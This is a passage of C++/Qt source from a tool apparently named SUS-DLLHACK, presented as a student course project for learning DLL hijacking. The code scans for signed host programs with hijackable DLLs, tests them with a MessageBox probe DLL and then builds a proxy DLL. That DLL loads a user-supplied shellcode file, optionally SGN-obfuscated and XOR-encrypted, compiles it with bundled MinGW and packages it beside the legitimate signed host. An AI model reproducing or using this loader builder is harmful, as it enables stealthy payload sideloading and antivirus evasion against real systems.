    generatorLayout->addWidget(caption(QStringLiteral("验证结果")), 0, 0);
    generatorLayout->addWidget(m_generatorTarget, 0, 1, 1, 2);
    generatorLayout->addWidget(loadLog, 0, 3);
    generatorLayout->addWidget(caption(QStringLiteral("模板文件")), 1, 0);
    generatorLayout->addWidget(m_templatePath, 1, 1);
    generatorLayout->addWidget(templateBrowse, 1, 2);
    generatorLayout->addWidget(templateSave, 1, 3);
    generatorLayout->addWidget(caption(QStringLiteral("默认模板")), 2, 0);
    generatorLayout->addWidget(m_templatePreset, 2, 1, 1, 3);
    generatorLayout->addWidget(caption(QStringLiteral("模板代码")), 3, 0);
    generatorLayout->addWidget(m_templateEditor, 3, 1, 1, 3);
    generatorLayout->addWidget(caption(QStringLiteral("bin文件")), 4, 0);
    generatorLayout->addWidget(m_binPath, 4, 1, 1, 2);
    generatorLayout->addWidget(binBrowse, 4, 3);
    generatorLayout->addWidget(caption(QStringLiteral("数据处理")), 5, 0);
    generatorLayout->addWidget(processPanel, 5, 1, 1, 3);
    generatorLayout->addWidget(generateDll, 6, 1, 1, 3, Qt::AlignHCenter);
    generatorLayout->setRowStretch(3, 1);
    generatorPageLayout->addWidget(generatorBox, 1);
    m_pages->addWidget(generatorPage);

    auto *aboutPage = new QWidget;
    auto *aboutLayout = new QVBoxLayout(aboutPage);
    aboutLayout->setContentsMargins(28, 28, 28, 28);
    aboutLayout->setSpacing(16);

    auto *aboutTitle = new QLabel(QStringLiteral("SUS-DLLHACK"));
    aboutTitle->setObjectName("AboutTitle");
    aboutLayout->addWidget(aboutTitle);

    auto *aboutSubTitle = new QLabel(QStringLiteral("基于白加黑技术的自动化 DLL 劫持检测与代理生成 Qt 系统"));
    aboutSubTitle->setObjectName("AboutSubtitle");
    aboutSubTitle->setWordWrap(true);
    aboutLayout->addWidget(aboutSubTitle);

    auto makeAboutBox = [](const QString &title, const QString &body) {
        auto *box = new QGroupBox(title);
        auto *layout = new QVBoxLayout(box);
        layout->setContentsMargins(16, 18, 16, 16);
        auto *label = new QLabel(body);
        label->setObjectName("AboutText");
        label->setWordWrap(true);
        label->setTextInteractionFlags(Qt::TextSelectableByMouse | Qt::LinksAccessibleByMouse);
        label->setOpenExternalLinks(true);
        layout->addWidget(label);
        return box;
    };

    aboutLayout->addWidget(makeAboutBox(QStringLiteral("作者信息"),
                                        QStringLiteral("作者：@X_Y\nQQ：3130796131")));
    aboutLayout->addWidget(makeAboutBox(QStringLiteral("项目目的"),
                                        QStringLiteral("SUS-DLLHACK 是一个《语言课程设计》QT课程作业的本地安全实验工具，主要用于学习 DLL 劫持、白加黑技术、导出函数验证、代理 DLL 自动生成等安全工具原理。")));
    aboutLayout->addWidget(makeAboutBox(QStringLiteral("免责声明"),
                                        QStringLiteral("本项目仅用于学习交流、安全研究与授权本地实验，禁止用于非法入侵、恶意传播、未授权系统或任何违法违规操作。因不当使用造成的后果由使用者自行承担。")));
    aboutLayout->addWidget(makeAboutBox(QStringLiteral("项目链接"),
                                        QStringLiteral("GitHub：<a href=\"https://github.com/X-Yzy/SUS-DLLHACK\">https://github.com/X-Yzy/SUS-DLLHACK</a>")));
    aboutLayout->addStretch(1);
    m_pages->addWidget(aboutPage);

    mainSplitter->setStretchFactor(1, 1);

    m_console = new QPlainTextEdit;
    m_console->setReadOnly(true);
    m_console->setMaximumBlockCount(1200);
    m_console->setFixedHeight(210);
    rootLayout->addWidget(m_console);

    setCentralWidget(root);

    connect(m_nav, &QListWidget::currentRowChanged, this, [this](int row) {
        if (m_pages && row >= 0 && row < m_pages->count()) {
            m_pages->setCurrentIndex(row);
        }
    });

    connect(scanBrowse, &QPushButton::clicked, this, [this]() {
        const QString path = QFileDialog::getExistingDirectory(this, QStringLiteral("选择扫描目录"));
        if (!path.isEmpty()) m_scanPath->setText(path);
    });
    auto bindFileBrowse = [this](QPushButton *button, QLineEdit *lineEdit, const QString &title) {
        connect(button, &QPushButton::clicked, this, [this, lineEdit, title]() {
            const QString path = QFileDialog::getOpenFileName(this, title);
            if (!path.isEmpty()) lineEdit->setText(path);
        });
    };
    bindFileBrowse(inputBrowse, m_inputFile, QStringLiteral("选择 PE 文件"));
    bindFileBrowse(moduleBrowse, m_moduleFile, QStringLiteral("选择 PE 模块"));
    bindFileBrowse(importBrowse, m_importFile, QStringLiteral("选择导入表目标"));
    bindFileBrowse(exportBrowse, m_exportFile, QStringLiteral("选择导出表目标"));
    bindFileBrowse(hostBrowse, m_hostExe, QStringLiteral("选择宿主 EXE"));
    bindFileBrowse(dllBrowse, m_proxyDll, QStringLiteral("选择候选 DLL"));

    connect(m_runScanButton, &QPushButton::clicked, this, [this]() {
        if (m_zeroEye.isRunning()) {
            appendEvent(QStringLiteral("提示"), QStringLiteral("扫描任务已在运行，本次点击已忽略。"));
            return;
        }
        const QString workDir = QCoreApplication::applicationDirPath();
        m_scanStopRequested = false;
        m_runScanButton->setEnabled(false);
        m_stopScanButton->setEnabled(true);
        appendEvent(QStringLiteral("扫描"), QStringLiteral("正在启动后台扫描任务。"));
        m_zeroEye.run(collectOptions(), workDir);
    });
    connect(m_stopScanButton, &QPushButton::clicked, this, [this]() {
        if (!m_zeroEye.isRunning()) {
            return;
        }
        m_scanStopRequested = true;
        appendEvent(QStringLiteral("扫描"), QStringLiteral("正在停止后台扫描任务。"));
        m_zeroEye.stop();
    });
    connect(loadExports, &QPushButton::clicked, this, [this]() {
        setExports(PeExports::read(m_proxyDll->text()));
        appendEvent(QStringLiteral("导出"), QStringLiteral("已从 %2 读取 %1 个导出函数。")
            .arg(m_exportItems.size())
            .arg(compactPath(m_proxyDll->text())));
    });
    connect(validate, &QPushButton::clicked, this, [this]() {
        m_batchActive = false;
        appendEvent(QStringLiteral("验证"), QStringLiteral("手动验证：%1 -> %2。")
            .arg(compactPath(m_hostExe->text()), compactPath(m_proxyDll->text())));
        m_validator.start(m_hostExe->text(), m_proxyDll->text());
    });
    connect(batch, &QPushButton::clicked, this, &MainWindow::startBatchValidation);
    connect(clearScanCache, &QPushButton::clicked, this, &MainWindow::clearCache);
    connect(m_templatePreset, qOverload<int>(&QComboBox::currentIndexChanged), this, [this](int index) {
        m_templateSource = index == 1 ? xorTemplateSource() : defaultTemplateSource();
        if (m_templateEditor) {
            m_templateEditor->setPlainText(m_templateSource);
        }
        if (m_templatePath) {
            m_templatePath->setText(index == 1
                ? QStringLiteral("内置模板：XOR 解密 code.data")
                : QStringLiteral("内置模板：直接加载 code.data"));
        }
        if (m_xorEncrypt) {
            m_xorEncrypt->setChecked(index == 1);
        }
    });
    connect(templateBrowse, &QPushButton::clicked, this, [this]() {
        const QString path = QFileDialog::getOpenFileName(this,
            QStringLiteral("选择模板函数 A() 源码"),
            QString(),
            QStringLiteral("C++ 源码 (*.cpp *.hpp *.h *.txt);;所有文件 (*.*)"));
        if (path.isEmpty()) {
            return;
        }
        QFile file(path);
        if (!file.open(QIODevice::ReadOnly | QIODevice::Text)) {
            appendEvent(QStringLiteral("错误"), QStringLiteral("模板文件无法读取：%1").arg(path));
            return;
        }
        m_templateSource = QString::fromUtf8(file.readAll());
        m_templatePath->setText(path);
        if (m_templateEditor) {
            m_templateEditor->setPlainText(m_templateSource);
        }
        appendEvent(QStringLiteral("模板"), QStringLiteral("已加载模板函数 A()：%1").arg(path));
    });
    connect(templateSave, &QPushButton::clicked, this, &MainWindow::saveTemplateSource);
    connect(loadLog, &QPushButton::clicked, this, &MainWindow::loadVerifiedCandidatesFromLog);
    connect(binBrowse, &QPushButton::clicked, this, [this]() {
        const QString path = QFileDialog::getOpenFileName(this,
            QStringLiteral("选择 bin 文件"),
            QString(),
            QStringLiteral("二进制文件 (*.bin);;所有文件 (*.*)"));
        if (!path.isEmpty()) {
            m_binPath->setText(path);
        }
    });
    connect(generateDll, &QPushButton::clicked, this, &MainWindow::generateProxyDll);
}

void MainWindow::connectSignals()
{
    connect(&m_zeroEye, &ZeroEyeTask::logLine, this, &MainWindow::appendScanLog);
    connect(&m_zeroEye, &ZeroEyeTask::failed, this, [this](const QString &reason) {
        appendEvent(QStringLiteral("错误"), reason);
        if (m_runScanButton) {
            m_runScanButton->setEnabled(true);
        }
        if (m_stopScanButton) {
            m_stopScanButton->setEnabled(false);
        }
    });
    connect(&m_zeroEye, &ZeroEyeTask::finished, this, [this](int exitCode, const QString &workDir) {
        if (m_runScanButton) {
            m_runScanButton->setEnabled(true);
        }
        if (m_stopScanButton) {
            m_stopScanButton->setEnabled(false);
        }
        if (m_scanStopRequested) {
            m_scanStopRequested = false;
            appendEvent(QStringLiteral("扫描"), QStringLiteral("扫描任务已停止。"));
            return;
        }
        appendEvent(QStringLiteral("扫描"), QStringLiteral("ZeroEye 扫描结束，退出码：%1。").arg(exitCode));
        normalizeScanOutput(workDir);
        const QString logDir = QDir(workDir).filePath("log");
        refreshResults(QDir(logDir).exists() ? logDir : workDir);
    });

    connect(&m_validator, &ProxyValidator::logLine, this, [this](const QString &line) {
        if (line.contains("generated", Qt::CaseInsensitive)) {
            appendEvent(QStringLiteral("代理"), QStringLiteral("探测源码已生成。"));
        } else if (line.contains("compiled", Qt::CaseInsensitive)) {
            appendEvent(QStringLiteral("代理"), QStringLiteral("探测 DLL 已编译，正在沙箱中启动宿主程序。"));
        } else if (line.contains("clang", Qt::CaseInsensitive)
                   || line.contains("gcc", Qt::CaseInsensitive)
                   || line.contains("mingw", Qt::CaseInsensitive)) {
            appendEvent(QStringLiteral("编译"), QStringLiteral("已调用随程序携带的极简 MinGW 编译代理 DLL。"));
        } else if (line.contains(QStringLiteral("代理编译器"))) {
            appendEvent(QStringLiteral("编译"), line);
        } else if (line.contains(QStringLiteral("已生成代理源码"))) {
            appendEvent(QStringLiteral("代理"), QStringLiteral("探测源码已生成。"));
        } else if (line.contains(QStringLiteral("代理 DLL 编译完成"))) {
            appendEvent(QStringLiteral("代理"), QStringLiteral("探测 DLL 已编译，正在沙箱中启动宿主程序。"));
        }
    });
    connect(&m_validator, &ProxyValidator::failed, this, [this](const QString &reason) {
        appendEvent(QStringLiteral("错误"), reason);
        if (m_batchActive) {
            updateValidationStatus(m_activeJob.row, QStringLiteral("失败"), QColor("#FF5577"));
            QTimer::singleShot(0, this, &MainWindow::runNextValidation);
        }
    });
    connect(&m_validator, &ProxyValidator::exportsLoaded, this, &MainWindow::setExports);
    connect(&m_validator, &ProxyValidator::validationFinished, this,
            [this](const QStringList &called, const QString &logPath, const QString &sourcePath) {
        const QString summary = called.isEmpty()
            ? QStringLiteral("未观察到导出函数调用")
            : QStringLiteral("命中 %1 个导出函数").arg(called.size());

        ValidationJob job = m_batchActive ? m_activeJob : ValidationJob{};
        if (!m_batchActive) {
            job.hostExe = m_hostExe->text();
            job.dllPath = m_proxyDll->text();
            job.label = QString("%1 / %2").arg(compactPath(job.hostExe), compactPath(job.dllPath));
        }

        const QString savedCpp = called.isEmpty()
            ? QString()
            : saveAnnotatedProxySource(sourcePath, job.dllPath, called);
        addVerifiedCandidate(job, called, savedCpp);
        showCalledExports(called, job, savedCpp);

        if (m_batchActive) {
            updateValidationStatus(m_activeJob.row, summary,
                                   called.isEmpty() ? QColor("#B5B5B5") : QColor("#00FF41"));
            appendEvent(QStringLiteral("结果"), QStringLiteral("%1：%2。").arg(m_activeJob.label, summary));
            if (!savedCpp.isEmpty()) {
                appendEvent(QStringLiteral("保存"), QStringLiteral("已生成可用代理源码：%1").arg(savedCpp));
            }
            appendEvent(QStringLiteral("日志"), logPath);
            QTimer::singleShot(0, this, &MainWindow::runNextValidation);
        } else {
            appendEvent(QStringLiteral("结果"), summary + QStringLiteral("。"));
            if (!savedCpp.isEmpty()) {
                appendEvent(QStringLiteral("保存"), QStringLiteral("已生成可用代理源码：%1").arg(savedCpp));
            }
            appendEvent(QStringLiteral("日志"), logPath);
        }
    });
}

void MainWindow::appendConsole(const QString &line)
{
    m_console->appendPlainText(QString("[%1] %2")
        .arg(QTime::currentTime().toString("HH:mm:ss"), line));
}

void MainWindow::appendEvent(const QString &level, const QString &message)
{
    appendConsole(QString("%1  %2").arg(level.leftJustified(6, ' '), message));
}

void MainWindow::appendScanLog(const QString &line)
{
    QString clean = line.simplified();
    if (clean.isEmpty()) {
        return;
    }

    if (clean.contains("Github:", Qt::CaseInsensitive)
        || clean.contains("Usage:", Qt::CaseInsensitive)
        || clean.contains("options:", Qt::CaseInsensitive)
        || clean.contains("examples:", Qt::CaseInsensitive)
        || clean.contains("ZeroEye [")
        || clean.startsWith("|")
        || clean.startsWith("/")) {
        return;
    }

    if (clean.contains("[+]")) {
        clean.replace("[+]", "");
        appendEvent(QStringLiteral("发现"), clean.trimmed());
    } else if (clean.contains("[-]")) {
        clean.replace("[-]", "");
        appendEvent(QStringLiteral("警告"), clean.trimmed());
    } else if (clean.contains("[*]")) {
        clean.replace("[*]", "");
        appendEvent(QStringLiteral("信息"), clean.trimmed());
    } else if (clean.contains("Generated", Qt::CaseInsensitive)
               || clean.contains("P/Invoke", Qt::CaseInsensitive)
               || clean.contains("Config", Qt::CaseInsensitive)
               || clean.contains("Signer", Qt::CaseInsensitive)
               || clean.contains("Dangerous", Qt::CaseInsensitive)
               || clean.contains("Execution Time", Qt::CaseInsensitive)
               || clean.contains(QStringLiteral("执行时间"))) {
        appendEvent(QStringLiteral("信息"), clean);
    }
}

ZeroEyeOptions MainWindow::collectOptions() const
{
    ZeroEyeOptions options;
    options.scanDirectory = m_scanPath->text();
    options.inputFile = m_inputFile->text();
    options.moduleFile = m_moduleFile->text();
    options.importFile = m_importFile->text();
    options.exportFile = m_exportFile->text();
    options.arch = m_arch->currentText() == QStringLiteral("任意架构") ? QString() : m_arch->currentText();
    options.scanType = m_scanType->currentText();
    options.excludeList = m_excludeList->text();
    options.signatureOnly = m_signatureOnly->isChecked();
    options.excludeSystemOnly = m_excludeSystem->isChecked();
    return options;
}

void MainWindow::normalizeScanOutput(const QString &workingDirectory)
{
    QDir workDir(workingDirectory);
    const QString rawPath = workDir.filePath("Eyebin");
    const QString logPath = workDir.filePath("log");
    const QString whitePath = QDir(logPath).filePath("Whitebin");
    QDir rawDir(rawPath);
    if (!rawDir.exists()) {
        return;
    }

    QDir().mkpath(logPath);
    QDir whiteDir(whitePath);
    if (whiteDir.exists()) {
        whiteDir.removeRecursively();
    }

    if (QFile::rename(rawPath, whitePath)) {
        appendEvent(QStringLiteral("整理"), QStringLiteral("扫描产物已归一为 Whitebin。"));
    } else if (copyDirectoryRecursively(rawPath, whitePath)) {
        rawDir.removeRecursively();
        appendEvent(QStringLiteral("整理"), QStringLiteral("扫描产物已复制到 log/Whitebin。"));
    } else {
        appendEvent(QStringLiteral("提示"), QStringLiteral("Whitebin 目录整理失败，将直接读取 Eyebin。"));
    }
}

void MainWindow::refreshResults(const QString &workingDirectory)
{
    m_exports->clear();
    m_resultItems = ExtractionManager::discover(workingDirectory);
    m_results->setRowCount(m_resultItems.size());
    for (int row = 0; row < m_resultItems.size(); ++row) {
        const ScanResult &item = m_resultItems[row];
        m_results->setItem(row, 0, new QTableWidgetItem(item.name));
        m_results->setItem(row, 1, new QTableWidgetItem(item.type));
        m_results->setItem(row, 2, new QTableWidgetItem(QString::number(item.dllCount)));
        m_results->setItem(row, 3, new QTableWidgetItem(item.sizeText));
        m_results->setItem(row, 4, new QTableWidgetItem(QStringLiteral("等待验证")));
    }
    m_results->resizeColumnsToContents();
    appendEvent(QStringLiteral("结果"), QStringLiteral("已整理出 %1 个扫描结果包。").arg(m_resultItems.size()));

    if (!m_scanPath->text().isEmpty() && !m_resultItems.isEmpty()) {
        const QString out = ExtractionManager::extractPreservingTree(
            m_resultItems, m_scanPath->text(), workingDirectory);
        appendEvent(QStringLiteral("提取"), QStringLiteral("已按原目录层级复制到：%1。").arg(out));
    }

    if (m_autoValidate->isChecked() && !m_resultItems.isEmpty()) {
        startBatchValidation();
    }
}

void MainWindow::startBatchValidation()
{
    if (m_validator.isRunning()) {
        appendEvent(QStringLiteral("队列"), QStringLiteral("验证器正在运行，本次队列启动已跳过。"));
        return;
    }

    m_validationQueue.clear();
    for (int row = 0; row < m_resultItems.size(); ++row) {
        enqueueBundleJobs(row, m_resultItems[row]);
    }

    if (m_validationQueue.isEmpty()) {
        appendEvent(QStringLiteral("队列"), QStringLiteral("未找到带导出表的原生 DLL 候选项。"));
        return;
    }

    m_batchActive = true;
    appendEvent(QStringLiteral("队列"), QStringLiteral("已加入 %1 个验证任务。").arg(m_validationQueue.size()));
    runNextValidation();
}

void MainWindow::enqueueBundleJobs(int row, const ScanResult &result)
{
    const QString hostExe = firstFileWithExtension(result.bundlePath, ".exe");
    if (hostExe.isEmpty()) {
        updateValidationStatus(row, QStringLiteral("未找到宿主 EXE"), QColor("#B5B5B5"));
        return;
    }

    const QStringList dlls = dllsWithExports(result.bundlePath);
    if (dlls.isEmpty()) {
        updateValidationStatus(row, QStringLiteral("无导出 DLL"), QColor("#B5B5B5"));
        return;
    }

    updateValidationStatus(row, QStringLiteral("已入队 %1 项").arg(dlls.size()), QColor("#00F0FF"));
    for (const QString &dll : dlls) {
        ValidationJob job;
        job.row = row;
        job.hostExe = hostExe;
        job.dllPath = dll;
        job.label = QString("%1 / %2").arg(result.name, compactPath(dll));
        m_validationQueue.enqueue(job);
    }
}

void MainWindow::runNextValidation()
{
    if (!m_batchActive) {
        return;
    }
    if (m_validationQueue.isEmpty()) {
        m_batchActive = false;
        appendEvent(QStringLiteral("队列"), QStringLiteral("批量验证完成。"));
        return;
    }

    m_activeJob = m_validationQueue.dequeue();
    updateValidationStatus(m_activeJob.row,
                           QStringLiteral("正在验证 %1").arg(compactPath(m_activeJob.dllPath)),
                           QColor("#00F0FF"));
    appendEvent(QStringLiteral("验证"), QStringLiteral("正在测试 %1 与 %2。")
        .arg(compactPath(m_activeJob.hostExe), compactPath(m_activeJob.dllPath)));
    m_validator.start(m_activeJob.hostExe, m_activeJob.dllPath);
}

void MainWindow::updateValidationStatus(int row, const QString &status, const QColor &color)
{
    if (row < 0 || row >= m_results->rowCount()) {
        return;
    }
    auto *item = m_results->item(row, 4);
    if (!item) {
        item = new QTableWidgetItem;
        m_results->setItem(row, 4, item);
    }
    item->setText(status);
    item->setForeground(color);
    m_results->resizeColumnToContents(4);
}

void MainWindow::showCalledExports(const QStringList &called, const ValidationJob &job, const QString &savedCppPath)
{
    if (called.isEmpty()) {
        return;
    }

    auto *header = new QListWidgetItem(QStringLiteral("%1  命中 %2 个").arg(job.label).arg(called.size()));
    header->setForeground(QColor("#00F0FF"));
    m_exports->addItem(header);

    for (const QString &name : called) {
        auto *item = new QListWidgetItem(QStringLiteral("  已调用  %1").arg(name));
        item->setForeground(QColor("#00FF41"));
        m_exports->addItem(item);
    }

    if (!savedCppPath.isEmpty()) {
        auto *pathItem = new QListWidgetItem(QStringLiteral("  源码  %1").arg(savedCppPath));
        pathItem->setForeground(QColor("#7FFFD4"));
        m_exports->addItem(pathItem);
    }
    m_exports->scrollToBottom();
}

QString MainWindow::saveAnnotatedProxySource(const QString &sourcePath,
                                             const QString &dllPath,
                                             const QStringList &called)
{
    {
        Q_UNUSED(sourcePath);

        const QVector<PeExportEntry> exports = PeExports::read(dllPath);
        if (exports.isEmpty() || called.isEmpty()) {
            return {};
        }

        QStringList output;
        const QFileInfo dllInfo(dllPath);
        output << QStringLiteral("// 目标 DLL: %1").arg(dllInfo.fileName());
        output << QStringLiteral("// 可用导出函数列表:");
        for (const QString &name : called) {
            output << QStringLiteral("//   - %1").arg(name);
        }
        output << "";
        output << QStringLiteral("#include <stdint.h>");
        output << QStringLiteral("#include <windows.h>");
        output << "";

        int fallbackIndex = 0;
        for (const PeExportEntry &entry : exports) {
            const QString stub = zeroEyeExportStub(entry, fallbackIndex++);
            if (!stub.isEmpty()) {
                output << stub;
            }
        }

        output << "";
        output << QStringLiteral("void Payload() {");
        output << QStringLiteral("    MessageBoxA(NULL, \"DLL Proxy Loaded (Method 1)\", \"ZeroEye\", MB_OK);");
        output << QStringLiteral("}");
        output << "";
        output << QStringLiteral("BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {");
        output << QStringLiteral("    switch (ul_reason_for_call) {");
        output << QStringLiteral("    case DLL_PROCESS_ATTACH: DisableThreadLibraryCalls(hModule); Payload(); break;");
        output << QStringLiteral("    case DLL_PROCESS_DETACH: break;");
        output << QStringLiteral("    }");
        output << QStringLiteral("    return TRUE;");
        output << QStringLiteral("}");

        const QString outPath = QDir(dllInfo.absolutePath())
            .filePath(dllInfo.completeBaseName() + "_validated_proxy.cpp");
        QFile outFile(outPath);
        if (!outFile.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
            return {};
        }

        QTextStream out(&outFile);
        out.setEncoding(QStringConverter::Utf8);
        out << output.join('\n') << '\n';
        return outPath;
    }

}

void MainWindow::addVerifiedCandidate(const ValidationJob &job,
                                      const QStringList &called,
                                      const QString &sourcePath)
{
    if (called.isEmpty() || job.dllPath.isEmpty()) {
        return;
    }

    VerifiedCandidate candidate;
    candidate.hostExe = job.hostExe;
    candidate.dllPath = job.dllPath;
    candidate.label = job.label.isEmpty()
        ? QStringLiteral("%1 / %2").arg(compactPath(job.hostExe), compactPath(job.dllPath))
        : job.label;
    candidate.sourcePath = sourcePath;
    candidate.calledExports = called;

    for (int i = 0; i < m_verifiedCandidates.size(); ++i) {
        const VerifiedCandidate &old = m_verifiedCandidates.at(i);
        if (QFileInfo(old.hostExe).absoluteFilePath() == QFileInfo(candidate.hostExe).absoluteFilePath()
            && QFileInfo(old.dllPath).absoluteFilePath() == QFileInfo(candidate.dllPath).absoluteFilePath()) {
            m_verifiedCandidates[i] = candidate;
            if (m_generatorTarget) {
                m_generatorTarget->setItemText(i, QStringLiteral("%1  命中 %2")
                    .arg(candidate.label)
                    .arg(candidate.calledExports.size()));
            }
            return;
        }
    }

    m_verifiedCandidates << candidate;
    if (m_generatorTarget) {
        m_generatorTarget->addItem(QStringLiteral("%1  命中 %2")
            .arg(candidate.label)
            .arg(candidate.calledExports.size()));
        m_generatorTarget->setCurrentIndex(m_generatorTarget->count() - 1);
    }
}

void MainWindow::generateProxyDll()
{
    if (m_templateEditor) {
        m_templateSource = m_templateEditor->toPlainText();
    }

    const int index = m_generatorTarget ? m_generatorTarget->currentIndex() : -1;
    if (index < 0 || index >= m_verifiedCandidates.size()) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("请先完成一次命中导出函数的验证。"));
        return;
    }

    const VerifiedCandidate candidate = m_verifiedCandidates.at(index);
    const QFileInfo hostInfo(candidate.hostExe);
    const QFileInfo dllInfo(candidate.dllPath);
    if (!hostInfo.exists() || !dllInfo.exists()) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("白文件或目标 DLL 不存在，无法生成。"));
        return;
    }

    const QString stamp = QDateTime::currentDateTime().toString("yyyyMMdd_hhmmss");
    const QString outDir = QDir(QCoreApplication::applicationDirPath())
        .filePath(QStringLiteral("output/%1_%2")
            .arg(safeFileStem(hostInfo.completeBaseName() + "_" + dllInfo.completeBaseName()), stamp));
    QDir().mkpath(outDir);

    QString templateSource = m_templateSource.trimmed().isEmpty()
        ? defaultTemplateSource()
        : m_templateSource;

    bool xorKeyOk = true;
    const bool xorEnabled = m_xorEncrypt && m_xorEncrypt->isChecked();
    const quint8 xorKey = parseXorKey(m_xorKey ? m_xorKey->text() : QStringLiteral("0x5A"), &xorKeyOk);
    if (xorEnabled && !xorKeyOk) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("XOR 密钥格式无效，请输入 0-255 或 0x00-0xFF。"));
        return;
    }
    if (xorEnabled) {
        const QString keyText = QStringLiteral("0x%1")
            .arg(static_cast<uint>(xorKey), 2, 16, QChar('0')).toUpper();
        templateSource.replace(QRegularExpression(QStringLiteral("BYTE\\s+key\\s*=\\s*0x[0-9A-Fa-f]+")),
                               QStringLiteral("BYTE key = %1").arg(keyText));
        templateSource.replace(QStringLiteral("XORDecrypt(pEncrypted, size);"),
                               QStringLiteral("XORDecrypt(pEncrypted, size, %1);").arg(keyText));
    }

    const QString binPath = m_binPath ? m_binPath->text().trimmed() : QString();
    if (!binPath.isEmpty()) {
        QFile input(binPath);
        if (!input.open(QIODevice::ReadOnly)) {
            appendEvent(QStringLiteral("错误"), QStringLiteral("bin 文件无法读取：%1").arg(binPath));
            return;
        }
        const QByteArray raw = input.readAll();
        QByteArray bytes = raw;
        if (m_sgnObfuscate && m_sgnObfuscate->isChecked()) {
            std::vector<std::uint8_t> payload(raw.begin(), raw.end());
            appendEvent(QStringLiteral("SGN"), QStringLiteral("正在混淆 bin：%1").arg(binPath));
            const std::vector<std::uint8_t> encodedBytes = sgnlite::encodeX64(payload);
            if (encodedBytes.empty()) {
                appendEvent(QStringLiteral("错误"), QStringLiteral("sgn 混淆失败：bin 为空或过大。"));
                return;
            }
            bytes = QByteArray(reinterpret_cast<const char *>(encodedBytes.data()),
                               static_cast<int>(encodedBytes.size()));
        } else {
            appendEvent(QStringLiteral("BIN"), QStringLiteral("未启用 sgn，直接生成 code.data：%1").arg(binPath));
        }
        if (xorEnabled) {
            for (int i = 0; i < bytes.size(); ++i) {
                bytes[i] = static_cast<char>(static_cast<unsigned char>(bytes.at(i)) ^ xorKey);
            }
            appendEvent(QStringLiteral("XOR"), QStringLiteral("已启用 XOR 加密，密钥：0x%1。")
                .arg(static_cast<uint>(xorKey), 2, 16, QChar('0')).toUpper());
        }
        const QString codeDataPath = QDir(outDir).filePath("code.data");
        QFile codeData(codeDataPath);
        if (!codeData.open(QIODevice::WriteOnly | QIODevice::Truncate)) {
            appendEvent(QStringLiteral("错误"), QStringLiteral("无法写入 code.data。"));
            return;
        }
        codeData.write(bytes);
        appendEvent(QStringLiteral("数据"), QStringLiteral("已生成 code.data，大小 %1 字节。").arg(bytes.size()));
    }

    const QVector<PeExportEntry> exports = PeExports::read(candidate.dllPath);
    if (exports.isEmpty()) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("目标 DLL 没有可生成的导出函数。"));
        return;
    }

    QStringList output;
    output << QStringLiteral("// 目标 DLL: %1").arg(dllInfo.fileName());
    output << QStringLiteral("// 可用导出函数列表:");
    for (const QString &name : candidate.calledExports) {
        output << QStringLiteral("//   - %1").arg(name);
    }
    output << "";
    output << templateSource;
    output << "";

    const QSet<QString> calledSet(candidate.calledExports.begin(), candidate.calledExports.end());
    int fallbackIndex = 0;
    for (const PeExportEntry &entry : exports) {
        const QString stub = finalExportStub(entry, calledSet, fallbackIndex++);
        if (!stub.isEmpty()) {
            output << stub;
        }
    }
    output << "";
    output << QStringLiteral("BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {");
    output << QStringLiteral("    switch (ul_reason_for_call) {");
    output << QStringLiteral("    case DLL_PROCESS_ATTACH: DisableThreadLibraryCalls(hModule); break;");
    output << QStringLiteral("    case DLL_PROCESS_DETACH: break;");
    output << QStringLiteral("    }");
    output << QStringLiteral("    return TRUE;");
    output << QStringLiteral("}");

    const QString sourcePath = QDir(outDir).filePath(dllInfo.completeBaseName() + "_proxy_final.cpp");
    QFile source(sourcePath);
    if (!source.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("无法写入代理 DLL 源码。"));
        return;
    }
    QTextStream srcOut(&source);
    srcOut.setEncoding(QStringConverter::Utf8);
    srcOut << output.join('\n') << '\n';
    source.close();

    const QString buildSourcePath = QDir(outDir).filePath(dllInfo.completeBaseName() + "_proxy_final_build.c");
    QFile buildSource(buildSourcePath);
    if (!buildSource.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("无法写入极简编译源码。"));
        return;
    }
    QTextStream buildOut(&buildSource);
    buildOut.setEncoding(QStringConverter::Utf8);
    buildOut << finalBuildSource(exports, calledSet, xorEnabled, xorKey);
    buildSource.close();

    const QString defPath = QDir(outDir).filePath(dllInfo.completeBaseName() + "_proxy_final.def");
    QFile defFile(defPath);
    if (!defFile.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("无法写入 DLL 导出定义文件。"));
        return;
    }
    QTextStream defOut(&defFile);
    defOut.setEncoding(QStringConverter::Utf8);
    defOut << finalDefSource(dllInfo, exports);
    defFile.close();

    const QString outDll = QDir(outDir).filePath(dllInfo.fileName());
    QString compilerOutput;
    const QString gcc = bundledMingwGccPath();
    QStringList args;
    args << "-fno-use-linker-plugin"
         << "-shared"
         << "-nostdlib"
         << "-Os"
         << "-s"
         << "-fno-stack-protector"
         << "-fno-builtin"
         << "-Wl,-e,DllMain"
         << "-o" << outDll
         << buildSourcePath
         << defPath
         << "-lkernel32";

    appendEvent(QStringLiteral("编译"), QStringLiteral("正在调用极简 MinGW：%1").arg(gcc));
    const bool compileOk = runTool(gcc, args, outDir, 60000, &compilerOutput);
    const QString compileLog = QDir(outDir).filePath("compile.log");
    QFile logFile(compileLog);
    if (logFile.open(QIODevice::WriteOnly | QIODevice::Text | QIODevice::Truncate)) {
        QTextStream logOut(&logFile);
        logOut.setEncoding(QStringConverter::Utf8);
        logOut << compilerOutput;
    }
    if (!compileOk || !QFileInfo::exists(outDll)) {
        appendEvent(QStringLiteral("错误"), QStringLiteral("MinGW 编译失败，详情：%1").arg(compileLog));
        return;
    }

    copyOverwrite(candidate.hostExe, QDir(outDir).filePath(hostInfo.fileName()));
    appendEvent(QStringLiteral("完成"), QStringLiteral("代理 DLL 与白文件已输出到：%1").arg(outDir));
}

void MainWindow::saveTemplateSource()
{
    if (m_templateEditor) {
